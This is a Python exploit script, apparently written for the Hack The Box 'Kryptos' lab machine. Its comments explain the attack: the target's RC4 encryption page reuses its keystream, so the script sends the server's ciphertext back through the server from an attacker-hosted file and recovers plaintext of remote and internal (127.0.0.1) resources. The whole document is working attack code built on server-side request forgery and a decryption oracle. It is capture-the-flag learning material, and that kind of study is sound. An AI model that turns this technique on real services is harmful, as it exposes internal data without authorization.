#!/usr/bin/python3

#-- RC4 Decryptor script --
# After step 1 re: Injection on the connection string and making the server authenticate against a database that we own
# 				 We are presented with a page that lets you encrypt a file in either modes AES or RC4. The file input is a #				remote URL. 
# Objective: Can we decrypt remote files, then can we decrypt whatever is on http:/127.0.0.1 from enumeration
# Issue:  After encrypting multiple files in rc4, we see that the the ciphertext is always the same
#			This indiciates that the keystream is being reused and always starts from the beginning 
# So we can do the following:
# Standard use case - p1 xor keystream = c1 
# Then store c1 in a file 
# Since keystream is reused then we can do c1 xor keystream = p1

# script will just replay encrypted content 
# Create a directory "files" eg /htb/kryptos/files
# this will be used to hold our encrypted content 

import requests as req
import sys
from bs4 import BeautifulSoup
import base64
import urllib.parse

ip = myip
port = myport

#take cookie first from first arg
cookieValue = sys.argv[1]

#take url to send from second arg
urlForFile = sys.argv[2]

#set cookie
cookies = {'PHPSESSID': cookieValue}

#static url of endpoint
urlToRequest = 'http://10.10.10.129/encrypt.php?cipher=RC4&url='

#our url we gonna request also for safety lets url encode
finalUrl = urlToRequest+urllib.parse.quote(urlForFile)

print (finalUrl)
#make the requests
r = req.get(finalUrl, cookies=cookies)

#lets parse the response
soup = BeautifulSoup(r.text, 'html.parser')
b64output = soup.find(id='output')
encryptedContents  = b64output.contents[0]

#base64 decode and save to file in files/test5.txt
try:
	file_content = base64.b64decode(encryptedContents)
	with open("files/test5.txt", "wb+") as f:
		f.write(file_content)
		f.close()
except Exception as e:
	print (str(e))

#make a new request to retrieve the file (test5.txt) -- this will effectively decrypt whatever we initially requested since the keystream is reused.. and we're xoring ciphertext with keystream, producing the plaintext
test5Url = urlToRequest+'http://' + ip +':' + port+ '/test5.txt'
r2 = req.get(test5Url, cookies=cookies)

#now lets beautify the contents, since it'll prob be html
soup = BeautifulSoup(r2.text, 'html.parser')
b64output = soup.find(id='output')
b64DecryptedContents = b64output.contents[0]
decryptedContents = BeautifulSoup(base64.b64decode(b64DecryptedContents), 'html.parser')
print (decryptedContents.prettify())
